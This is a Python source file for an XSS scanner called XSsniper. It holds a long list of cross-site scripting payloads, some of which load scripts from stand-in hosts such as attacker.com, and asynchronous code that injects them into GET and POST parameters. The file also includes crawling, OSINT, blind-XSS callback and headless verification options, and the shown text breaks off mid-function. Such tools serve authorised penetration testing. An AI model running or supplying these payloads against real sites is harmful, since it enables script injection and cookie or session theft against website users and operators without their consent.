#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSsniper - Reflected XSS Scanner
Version: 0.4 
Legal use only
"""

import httpx
import asyncio
import argparse
from urllib.parse import quote
import sys
from datetime import datetime
import json 
# Professional XSS verification modules
from xss_analyzer import XSSContextAnalyzer
from headless_verifier import HeadlessXSSVerifier
from ml.classifier import XSSMLClassifier
from blind_xss_server import BlindXSSServer
import threading
import os
from typing import Dict

from crawler import Crawler


# ──────────────────────────────────────────────#
#               PAYLOADS                        #
# ──────────────────────────────────────────────#
PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg onload=alert('XSS')>",
    "javascript:alert(1)",
    "javascript:alert('XSS')",
    "<body onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<math><mtext onclick=alert(1)>click",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "';alert(1);//",
    "\");alert(1);//",
    "<script>alert`1`</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "data:text/html,<script>alert(1)</script>",
    "<img src=//attacker.com/xss.jpg onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<isindex action=javascript:alert(1)>",
    "<base href=javascript:alert(1)//>",
    "<style>@import'javascript:alert(1)';</style>",
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<sCrIpT>alert(1)</sCrIpT>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<xmp><svg onload=alert(1)>",
    "<noscript><img src=x onerror=alert(1)>",
    "<script src=data:,alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<menuitem onmouseover=alert(1)>",
    "<iframe srcdoc='<svg onload=alert(1)>'></iframe>",
    "<style onload=alert(1)>",
    "<br size=\"&{alert(1)}\">",
    "<script>eval('al'+'ert(1)')</script>",
    "<script>Function('alert(1)')()</script>",
    "<img src=x onerror=print()>",
    "<svg onload=confirm(document.domain)>",
    "<body onload=alert(String.fromCharCode(88,83,83))>",
    "\"><script>alert(document.cookie)</script>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=# onmouseover=alert(1)>",
    "<BODY BACKGROUND=\"javascript:alert(1)\">",
    "<TABLE BACKGROUND=\"javascript:alert(1)\">",
    "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
    "<STYLE>.x(*) {background:url(javascript:alert(1))}</STYLE>",
    "<IMG SRC=\"jav&#x09;ascript:alert(1);\">",
    "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74:alert(1)>",
    "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000110&#0000116&#0000040&#00000971&#00000041&#00000062>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='alert(1)//",
    "<details ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<source src=x onerror=alert(1)>",
    "<style>@import&#x9;javascript:alert(1)</style>",
    "<style>@import&#xA;javascript:alert(1)</style>",
    "<style>@import&#xD;javascript:alert(1)</style>",
    "<!--<svg onload=alert(1)>",
    "</script><svg onload=alert(1)>",
    "</textarea><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)//>",
    "<script>alert(1)</script><!--",
    "<img src=x onerror=alert(1)//<img>",
    "<svg onload=alert(1)//<svg>",
    "'\"<svg onload=alert(1)>",
    "\"><svg onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "';alert(1);var x='",
    "<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>",
    "<SCRIPT a=/XSS/ src=http://attacker.com></SCRIPT>",
    "<INPUT TYPE=IMAGE SRC=javascript:alert(1)>",
    "<IMG DYNSRC=javascript:alert(1)>",
    "<STYLE>li {list-style-image: url(\"javascript:alert(1)\");}</STYLE><A>",
    "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
    "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(1)';</STYLE>",
    "<META HTTP-EQUIV=\"Link\" Content=\"<http://attacker.com>; REL=stylesheet\">",
    "<STYLE><!--</title></style></textarea></script></xmp><svg/onload=alert(1)>",
    "<IMG SRC=\"javascript:alert(1)\" AUTOFOCUS ONFOCUS=alert(1)>",
    "<IMG SRC=\"jav&#x0A;ascript:alert(1);\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert(1);\">",
    "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://attacker.com/scriptlet.html\">",
    "<EMBED SRC=\"javascript:alert(1)\" TYPE=\"text/plain\">",
    "<TABLE BACKGROUND=\"javascript:alert(String.fromCharCode(88,83,83))\">",
    "<a href=\"javascript:alert(1)\">XSS</a>",
    "<form><button formaction=\"javascript:alert(1)\">Submit</button></form>",
    "<body onscroll=alert(1)><iframe src=1 onload=this.scrollTop=1>",
    "<div onmouseover=\"alert(1)\" onmouseenter=alert(1)>XSS</div>",
    "<math href=\"javascript:alert(1)\"><mtext>",
    "<picture><source onerror=alert(1)><img src=x>",
    "<link rel=preload as=script onerror=alert(1) href=x>",
    "<applet code=\"javascript:alert(1)\">",
    "<noembed><svg onload=alert(1)>",
    "<xmp><script>alert(1)</script>",
    "<plaintext><script>alert(1)</script>",
    "<isindex type=image src=x onerror=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<col onmouseover=alert(1)>",
    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
    "<script>alert(1)</script>",
    "<scr%00ipt>alert(1)</scr%00ipt>",
    "<scr ipt>alert(1)</scr ipt>",
    "<script type=\"text/javascript\">alert(1)</script>",
    "<script>/*<svg onload=alert(1)>*/</script>",
    "javascript://%0aalert(1)",
    "JaVaScRiPt:alert(1)",
    "javascript&#x3a;alert(1)",
    "&#x6A&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29",
    "data:;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<img src=x oNeRrOr=alert(1)>",
    "<iMg SrC=x ErRoR=AlErT(1)>",
    "<svg onload=alert(String.fromCharCode(88,83,83))>",
    "<svg/onload=alert`1`>",
    "<svg %00onload=alert(1)>",
    "</sCript><ScRiPt>alert(1)</sCript>",
    "<img src=x onerror=alert(1) %00>",
    "&#x3c;img src=x onerror=alert&#x28;1&#x29;&#x3e;",
    "%3csvg%20onload%3dalert%281%29%3e",
    "<script>alert(1)</scr%00ipt>",
    "<body onload=alert(1)/>",
    "<iframe src=\"jav&#x09;ascript:alert(1)\">",
    "<iframe src=&#x00006A&#x000061&#x000076&#x000061&#x000073&#x000063&#x000072&#x000069&#x000070&#x000074&#x003A;&#x0061;&#x006C;&#x0065;&#x0072;&#x0074;&#x0028;&#x0031;&#x0029>",
    "<style>@import url(\"javascript:alert(1)\");</style>",
    "<style>@im\\port'javascript:alert(1)';</style>",
    "<style background=\"url('javascript:alert(1)')\">",
    "<body background=\"javascript:alert(1)\">",
    "<body expr=\"javascript:alert(1)\">",
    "<table background=\"javascript:alert(1)\">",
    "<td background=\"javascript:alert(1)\">",
    "<div style=\"background-image:url(javascript:alert(1))\">",
    "<div style=\"width:expression(alert(1))\">",
    "<input style=\"background:url(javascript:alert(1))\">",
    "<style>*{background:url(\"javascript:alert(1)\")}</style>",
    "javascript:alert(1);javascript:alert(1)",
    "javascript://foo@//attacker.com/xss.js",
    "<script src=\"http://attacker.com/xss.js\"></script>",
    "<script src=\"//attacker.com/xss.js\"></script>",
    "<script src=\"data:text/javascript,alert(1)\"></script>",
    "<script src=\"data:,alert(1)\"></script>",
    "<script src=//evil.com></script>",
    "<img src=\"https://attacker.com/xss.jpg\" onerror=\"alert(1)\">",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
    "\"><script>alert(1)</script>",
    "\';&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;&#x27;",
    "<img src=\"x:x\" onerror=\"alert(1)\"/>",
    "<img/src=\"x\"onerror=alert(1)/>",
    "<img src=x onerror=alert(1)/>",
    "<img src=\"x\"onerror=\"alert(1)\">",
    "<img src=x\"onerror=\"n\"=\"o\"onerror=alert(1)>",
    "<img src=\"x:x\"onerror=alert(1)>",
    "<img src=x onerror=\"/*--></script>*/alert(1)\">",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>\\x3e",
    "<!--\x3e<script>alert(1)</script>-->",
    "<img src=\"x\" onerror=\"alert(1)\" &#x09;&#x0a;&#x0d;/>",
    "<svg/onload=alert(1)/onmouseover=alert(2)>",
    "<script>alert(1)\x3c/script>",
    "<script>alert(1)\u003c/script>",
    "%253Cimg%20src%3Dx%20onerror%3dalert%281%29%253E",
    "&#x003c;&#x73;&#x76;&#x67;&#x2f;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3e;",
    "<svg xmlns:xlink=\"http://attacker.com/xlink\" onload=alert(1)>",
    "<animate onbegin=alert(1) attributeName=x>",
    "<set onbegin=alert(1) attributeName=x>",
    "<handler onbegin=alert(1)>",
    "<listener onbegin=alert(1)>",
    "<use xlink:href=\"javascript:alert(1)\">",
    "<feimage xlink:href=\"javascript:alert(1)\">",
    "<foreignobject onmouseover=alert(1)>",
    "<use href=\"#\x3csvg/onload=alert(1)\">",
    "<svg><style>@import\"javascript:alert(1)\";</style>",
    "<style>@import\"javascript://%0aalert(1)\";</style>",
    "<style>@im\\port'java\\script:alert(1)';</style>",
    "<style>@import url(javascript:alert(1));</style>",
    "<style>@import'java\0script:alert(1)'</style>",
    "<style>@import'java\x0010script:alert(1)'</style>",
    "<style>@import`javascript:alert(1)`</style>",
    "<style>@import'javascript:alert(1)\x0b';</style>",
    "<style>@import'javascript:alert(1)\x0c';</style>",
    "<style>@import'javascript:alert(1)\r';</style>",
    "<style>@import'javascript:alert(1)\n';</style>",
    "<style>@import'javascript:alert(1)\t';</style>",
    "<style>@import'javascript:alert(1)%09';</style>",
    "<style>@import'javascript:alert(1)%0A';</style>",
    "<style>@import'javascript:alert(1)%0D';</style>",
    "<body onload=alert(1)\u2028>",
    "<body onload=alert(1)\u2029>",
    "<img src=x onerror=alert(1)\u2028>",
    "<svg onload=alert(1)\u2028>",
    "<script>alert(1)\u003c/script>",
    "<script>alert(1)\x3c/script>",
    "javascript:alert(1)\u003b",
    "javascript:alert(1)%09",
    "javascript:alert(1)%0a",
    "javascript:alert(1)%0d",
    "javascript:alert(1)%00",
    "<!--><img src=x onerror=alert(1)>",
    "\x3cscript\x3ealert(1)\x3c/script\x3e",
    "\x3csvg onload=alert(1)\x3e",
    "\x3cimg src=x onerror=alert(1)\x3e",
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    "<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
    "<script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>",
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;",
    "%2566%2563%2563%25%3166%2561%25%3171%25%3177%25%3161%25%3173%25%3163%25%3172%25%3166%25%3174%253a%25%3161%25%316c%25%3165%25%3172%25%3174%2528%2521%2529",
    "<script>alert(1)</script%s>",
    "<script>alert(1)</sc%00ript>",
    "<img src=x onerror=alert(1)%0a>",
    "<img src=x onerror=alert(1)%00>",
    "<svg onload=alert(1)%00>",
    "javascript:alert(1)%250a",
    "<body onload=alert(1)%09>",
    "<iframe src=\"java%09script:alert(1)\">",
    "<iframe src=\"java%0ascript:alert(1)\">",
    "<iframe src=\"java%0dscript:alert(1)\">",
    "&#x3c;&#x69;&#x6d;&#x67&#x20;&#x73;&#x72;&#x63;&#x3d;&#x78&#x20;&#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3e;",
    "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
    "<SCRIPT a=\"&gt;\" b=&quot;&gt;\" src=http://attacker.com/xss.js></SCRIPT>",
    "<SCRIPT SRC=//attacker.com/.j\">",
    "<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\">",
    "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
    "<DIV STYLE=\"width: expression(alert('XSS'));\">",
    "<STYLE>@import'java\\**/*script:alert(1)';</STYLE>",
    "<BASE HREF=\"javascript:alert(1);//\">",
    "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(1)>",
    "<EMBED SRC=\"javascript:alert(1);\" TYPE=\"text/plain\" >",
    "<XML ID=\"x\"> <X> <SCRIPT>alert(1)</SCRIPT> </X> </XML>",
    "<STYLE>@import&#x9;url(\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u0029\u003B;</STYLE>",
    "<BODY onload=\"&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">",
    "<sVg/oNloAd=alert(1)//><sVg>",
    "<sVg <sVg/oNloAd=alert(1)//>",
    "<sVg%0Aonload=alert(1)//>",
    "<sVg%09onload=alert(1)//>",
    "<sVg%0Donload=alert(1)//>",
    "<!--><sVg oNloAd=alert(1)>",
    "</TiTlE><sVg oNloAd=alert(1)>",
    "</sTyLe><sVg oNloAd=alert(1)>",
    "</TexTaReA><sVg oNloAd=alert(1)>",
    "</ScRiPt><sVg oNloAd=alert(1)>",
    "<ScRiPt>alert(1)</sCrIpt>",
    "<scr%00ipt>alert(1)</scr%00ipt>",
    "<SCRIPT SRC=//google.com/search?q=alert(1)>",
    "javascript:alert(1)//\\x3csVg onload=alert(1)//",
    "<!--?%3E><svg onload=alert(1)>",
    "<?xml-stylesheet href=\"javascript:alert(1)\"?>",
    "<!DOCTYPE html PUBLIC \"-//example.com/xhtml+xml\" \"http://attacker.com/xss.dtd\"><html>",
    "<![CDATA[<svg onload=alert(1)>]]>",
    "<a href=\"javascript:alert(1)\">clickme</a><a>",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<body onresize=alert(1) style=position:absolute;height:*;width:*;>",
    "<div style=\"background:url(javascript:alert(1))\">test</div>",
    "<div onscroll=alert(1) style=overflow:scroll;height:1;width:1><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>"
];

# SETTINGS
DELAY = 0.6                 # seconds between requests
TIMEOUT = 12                # request timeout
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
HEADERS = {"User-Agent": USER_AGENT}

BANNER = f"""
╔════════════════════════════════════════════╗
║             XSSNIPER v0.4                  ║
║          reflected XSS scanner             ║
║   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                      ║
╚════════════════════════════════════════════╝
"""

# interesting http codes
INTERESTING_CODES = {500, 501, 502, 503, 403, 406, 429}

# ANSI color codes (for --color option)
COLORS = {
    'green': '\033[92m',
    'red': '\033[91m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m',
    'reset': '\033[0m'
}

# Professional verification settings
analyzer = XSSContextAnalyzer()
ml_classifier = XSSMLClassifier()
headless_verifier = None
blind_xss_server = None

def colorize(text, color_name, use_color):
    if use_color and color_name in COLORS:
        return f"{COLORS[color_name]}{text}{COLORS['reset']}"
    return text


def is_likely_reflected(payload: str, response_text: str) -> bool:
    """Simple heuristic: the payload is in the response and there is no explicit HTML escaping"""
    if not payload:
        return False
    
    # Payload found in response
    if payload in response_text or payload.lower() in response_text.lower():
        # Check if it is escaped by typical means
        escaped_variants = [
            payload.replace("<", "&lt;"),
            payload.replace(">", "&gt;"),
            payload.replace('"', "&quot;"),
            payload.replace("'", "&#x27;"),
            payload.replace("'", "&#39;"),
        ]
        
        for escaped in escaped_variants:
            if escaped in response_text:
                return False  # likely escaped
        
        return True
    
    return False


def load_payloads_from_file(filepath: str) -> list:
    """Loads payloads from a file. Ignores blank lines and comments. (#)."""
    payloads = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.append(line)
        return payloads
    except FileNotFoundError:
        print(f"[!] FileNotFound: {filepath}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error loading payloads from file: {filepath}: {e}")
        sys.exit(1)


async def verify_xss_professional(test_url: str, payload: str, response_text: str, status_code: int, use_color: bool) -> Dict:
    """
    Professional XSS verification with all analysis levels
    """
    global headless_verifier, ml_classifier, blind_xss_server
    
    result = {
        'is_xss': False,
        'confidence': 0.0,
        'context': None,
        'executed': False,
        'waf_detected': False,
        'evidence': [],
        'ml_prediction': None,
        'headless_result': None
    }
    
    # Level 1: Contextual analysis
    analysis = analyzer.analyze_response(payload, response_text, test_url)
    result['context'] = analysis['context']
    result['waf_detected'] = analysis['waf_detected']
    result['evidence'] = analysis['evidence']
    result['confidence'] = analysis['confidence']
    
    # Level 2: ML classification (if available)
    if ml_classifier and ml_classifier.is_trained:
        ml_result = ml_classifier.predict(payload, response_text)
        result['ml_prediction'] = ml_result
        # combine confidence 
        result['confidence'] = (result['confidence'] + ml_result['confidence']) / 2
    
    # Level 3: Headless verification (if enabled)
    if headless_verifier and analysis['confidence'] > 0.5:
        try:
            headless_result = await headless_verifier.verify_xss(test_url, payload)
            result['headless_result'] = headless_result
            
            if headless_result['executed']:
                result['is_xss'] = True
                result['confidence'] = 1.0
                result['executed'] = True
                result['evidence'].append("✅ Confirmed in headless browser")
                
                if headless_result.get('alert_detected'):
                    result['evidence'].append(f"🚨 Alert detected: {headless_result['alert_message']}")
        except Exception as e:
            result['evidence'].append(f"⚠️ Headless error: {str(e)[:50]}")
    
    # Level 4: Determine is_xss by confidence
    if not result['is_xss']:
        result['is_xss'] = result['confidence'] > 0.7
    
    return result


async def process_payload(semaphore, print_lock, client, target, payload, idx, total, use_color, delay):
    """Universal function for sending requests with professional verification"""
    async with semaphore:
        url_template = target['url']
        method = target['method']
        post_data_template = target.get('data')
        use_json = target.get('json', False)
        
        # code payload
        encoded = quote(payload, safe="=&/")
        
        # url and data preparation
        if method == 'GET':
            test_url = url_template.replace("FUZZ", encoded) if "FUZZ" in url_template else url_template + encoded
            request_data = None
        else:  # POST
            test_url = url_template
            if post_data_template:
                if isinstance(post_data_template, dict):
                    processed_data = {}
                    for key, value in post_data_template.items():
                        if isinstance(value, str):
                            processed_data[key] = value.replace("FUZZ", encoded) if "FUZZ" in value else value
                        else:
                            processed_data[key] = value
                else:
                    processed_data = post_data_template
            else:
                processed_data = {}

        try:
            # send request
            if method == 'GET':
                r = await client.get(test_url, follow_redirects=True)
            else:
                if use_json:
                    r = await client.post(test_url, json=processed_data, follow_redirects=True)
                else:
                    r = await client.post(test_url, data=processed_data, follow_redirects=True)
            
            await asyncio.sleep(delay)

            # 🎯 proffesional payload
            verification = await verify_xss_professional(
                test_url=test_url,
                payload=payload,
                response_text=r.text,
                status_code=r.status_code,
                use_color=use_color
            )

            async with print_lock:
                # numbering and payload preview
                print(f"[{idx:02d}/{total}] → {payload[:100]}{'...' if len(payload)>100 else ''}", end=" ")

                if verification['is_xss']:
                    # emj 
                    if verification['confidence'] >= 0.9:
                        emoji = "🔥"  # admin
                        color = "red"
                    elif verification['confidence'] >= 0.7:
                        emoji = "✅"
                        color = "green"
                    else:
                        emoji = "⚠️"
                        color = "yellow"
                    
                    print(colorize(f"  → {emoji} [XSS!] ", color, use_color))
                    print(f"      URL: {test_url}")
                    if method == 'POST':
                        print(f"      Data: {processed_data}")
                    print(f"      Code: {colorize(str(r.status_code), 'green', use_color)} | Length: {len(r.text):,} bytes")
                    print(f"      Confidence: {colorize(f'{verification['confidence']:.1%}', color, use_color)}")
                    
                    if verification['context']:
                        print(f"      Context: {verification['context']}")
                    
                    if verification['waf_detected']:
                        print(f"      WAF: {colorize('Detected', 'magenta', use_color)}")
                    
                    if verification['evidence']:
                        print(f"      Evidence: {verification['evidence'][0][:100]}")
                    
                    print(f"      Payload: {payload}\n")
                    
                    return {
                        'idx': idx,
                        'payload': payload,
                        'url': test_url,
                        'data': processed_data if method == 'POST' else None,
                        'code': r.status_code,
                        'length': len(r.text),
                        'method': method,
                        'confidence': verification['confidence'],
                        'context': verification['context'],
                        'waf_detected': verification['waf_detected']
                    }
                    
                elif verification['confidence'] > 0.3:
                    print(colorize(f"  → 🤔 [SUSPICIOUS] {verification['confidence']:.0%}", "yellow", use_color))
                    
                elif r.status_code in INTERESTING_CODES:
                    print(colorize(f"🛡️ {r.status_code} (interesting)", "magenta", use_color))
                    print()
                else:
                    print(colorize(f"  → ❌ {r.status_code}", "red", use_color))
                    print()

        except httpx.TimeoutException:
            async with print_lock:
                print(f"[{idx:02d}/{total}] → {payload[:55]}{'...' if len(payload)>55 else ''} ", end="")
                print(colorize("  → ⏰ Timeout", "blue", use_color))
        except httpx.ConnectError:
            async with print_lock:
                print(f"[{idx:02d}/{total}] → {payload[:55]}{'...' if len(payload)>55 else ''} ", end="")
                print(colorize("  → 🔌 Connection error", "cyan", use_color))
        except httpx.HTTPError as e:
            async with print_lock:
                print(f"[{idx:02d}/{total}] → {payload[:55]}{'...' if len(payload)>55 else ''} ", end="")
                print(colorize(f"  → ⚠️ Error: {str(e)[:60]}", "yellow", use_color))

        return None


async def sniper(targets: list, payloads: list, use_color: bool = False, 
                 delay: float = 0.6, concurrency: int = 5):
    """Universal scanner for multiple targets (GET and POST)"""
    print(BANNER)
    print(f"[+] Total targets: {len(targets)}")
    print(f"[+] Payloads per target: {len(payloads)}")
    print(f"[+] Total requests: {len(targets) * len(payloads)}")
    print(f"[+] Concurrency: {concurrency} requests at a time\n")
    
    semaphore = asyncio.Semaphore(concurrency)
    print_lock = asyncio.Lock()
    
    all_successful = []
    target_count = 0
    
    async with httpx.AsyncClient(headers=HEADERS, timeout=TIMEOUT) as client:
        for target in targets:
            target_count += 1
            target_desc = f"{target['method']} {target['url']}"
            if target.get('data'):
                target_desc += f" data: {target['data']}"
            
            print(colorize(f"\n[🎯] Target {target_count}/{len(targets)}: {target_desc}", "cyan", use_color))
            
            tasks = []
            for idx, payload in enumerate(payloads, 1):
                task = asyncio.create_task(
                    process_payload(semaphore, print_lock, client, target, payload, 
                                   idx, len(payloads), use_color, delay)
                )
                tasks.append(task)

            results = await asyncio.gather(*tasks)
            successful = [r for r in results if r is not None]
            all_successful.extend(successful)
    
    if all_successful:
        print(colorize(f"[!] Found potential XSS: {len(all_successful)}", "green", use_color))
        print("\n📋 LIST OF SUCCESSFUL PAYLOADS:")
    
        # Sort by confidence
        all_successful.sort(key=lambda x: x['confidence'], reverse=True)
    
        for item in all_successful:
            confidence_color = "green" if item['confidence'] > 0.9 else "yellow"
            print(f"  [{item['idx']:02d}] {item['payload'][:70]}")
            print(f"      URL: {item['url']}")
            if item.get('data'):
                print(f"      Data: {item['data']}")
            print(f"      Method: {item.get('method', 'GET')}")
            confidence_value = item['confidence']
            confidence_color = "green" if item['confidence'] > 0.9 else "yellow"
            print(f"      Confidence: {colorize(f'{confidence_value:.1%}', confidence_color, use_color)}")
            if item.get('context'):
                print(f"      Context: {item['context']}")
            if item.get('waf_detected'):
                print(f"      WAF: {colorize('Detected', 'magenta', use_color)}")
            print(f"      Code: {colorize(str(item['code']), 'yellow', use_color)} | Length: {item['length']:,} bytes\n")
    
        # stats yver
        high_conf = len([x for x in all_successful if x['confidence'] > 0.9])
        medium_conf = len([x for x in all_successful if 0.7 < x['confidence'] <= 0.9])
        low_conf = len([x for x in all_successful if x['confidence'] <= 0.7])
    
        print(colorize(f"    High confidence (🔥): {high_conf}", "red", use_color))
        print(colorize(f"    Medium confidence (✅): {medium_conf}", "green", use_color))
        print(colorize(f"    Low confidence (⚠️): {low_conf}", "yellow", use_color))
        print("    Check MANUALLY in browser (many WAF/filters may block some payloads)")

    else:
        print(colorize("[-] Nothing suspicious detected with current payload set", "red", use_color))


def main():
    parser = argparse.ArgumentParser(
        description="XSSNIPER — Professional XSS Scanner with Crawler & POST support",
        epilog="""Examples:
  Basic GET scan:    python3 xssniper.py -u 'http://site.com/search?q=FUZZ' --color
  POST scan:         python3 xssniper.py -u 'http://site.com/login' --method POST --data 'user=FUZZ&pass=123' --color
  JSON API scan:     python3 xssniper.py -u 'http://site.com/api' --method POST --data '{"name":"FUZZ"}' --json --color
  Crawl + scan:      python3 xssniper.py -u 'http://site.com/' --crawl --max-depth 3 --max-urls 100 --color
  Full power:        python3 xssniper.py -u 'http://site.com/' --crawl --max-depth 3 --concurrency 10 --color --cookies "PHPSESSID=abc123"
        """
    )
    
    parser.add_argument("-u", "--url", required=True,
                        help="Target URL (with FUZZ for GET or base URL for crawling)")
    
    # POST options
    parser.add_argument("--method", choices=["GET", "POST"], default="GET",
                        help="HTTP method to use (default: GET)")
    parser.add_argument("--data", 
                        help="POST data. Can be query string (key=value) or JSON string")
    parser.add_argument("--json", action="store_true",
                        help="Send POST data as JSON (requires valid JSON in --data)")
    
    # Crawler options
    parser.add_argument("--crawl", action="store_true",
                        help="Enable intelligent crawling to discover targets")
    parser.add_argument("--max-depth", type=int, default=2,
                        help="Maximum crawl depth (default: 2)")
    parser.add_argument("--max-urls", type=int, default=150,
                        help="Maximum URLs to crawl (default: 150)")
    parser.add_argument("--cookies", 
                        help="Cookies for authenticated crawling (format: 'name=value; name2=value2')")
    parser.add_argument("--osint", action="store_true",
                    help="Enable OSINT mode: collect emails, phones, comments, hidden fields, etc.")
    
    # Existing options
    parser.add_argument("-f", "--payloads-file",
                        help="File with custom payloads (one per line)")
    parser.add_argument("--append", action="store_true",
                        help="Append payloads from file to built-in list (default: replace)")
    parser.add_argument("--color", action="store_true",
                        help="Enable colored output (ANSI colors)")
    parser.add_argument("-d", "--delay", type=float, default=0.6,
                        help="Delay between requests in seconds (default: 0.6)")
    parser.add_argument("--concurrency", type=int, default=20,
                        help="Number of concurrent requests (default: 20)")
    
    # Professional verification options
    parser.add_argument("--verify-headless", action="store_true",
                    help="Use headless browser for verification (slow but accurate)")
    parser.add_argument("--blind-xss-port", type=int, default=8080,
                    help="Port for Blind XSS callback server (default: 8080)")
    parser.add_argument("--blind-xss-domain", 
                    help="Your domain for Blind XSS callbacks (e.g., attacker.com)")
    parser.add_argument("--ml-model", 
                    help="Path to trained ML model file")
    parser.add_argument("--confidence-threshold", type=float, default=0.7,
                    help="Confidence threshold for reporting (0.0-1.0, default: 0.7)")

    #FULL POWER OPTIONS
    parser.add_argument("--full", action="store_true",
                        help="Enable full scan: crawling, OSINT, and color output")
    parser.add_argument("--full-an", action="store_true",
                        help="Enable full analysis: ML model (default path) and headless verification")                    
    
    args = parser.parse_args()

    #--full
    if args.full:
        args.crawl = True
        args.osint = True
        args.color = True

    #--full-an
    if args.full_an:
        args.verify_headless = True
        if args.ml_model is None:
            args.ml_model = "ml/model.pkl"

    # Initialize professional verification components
    global headless_verifier, blind_xss_server, ml_classifier

    if args.verify_headless:
        print("[🌐] Initializing headless browser verifier...")
        headless_verifier = HeadlessXSSVerifier(headless=True)
        asyncio.create_task(headless_verifier.initialize())

    if args.blind_xss_domain:
        print(f"[📡] Starting Blind XSS server on port {args.blind_xss_port}...")
        blind_xss_server = BlindXSSServer(port=args.blind_xss_port)
        blind_xss_server.start()
    
        # Generate Blind XSS payloads
        blind_payloads = blind_xss_server.generate_payloads(args.blind_xss_domain)
        print(f"[📡] Blind XSS payloads ready:")
        for name, payload in blind_payloads.items():
            print(f"      {name}: {payload[:50]}...")

    if args.ml_model and os.path.exists(args.ml_model):
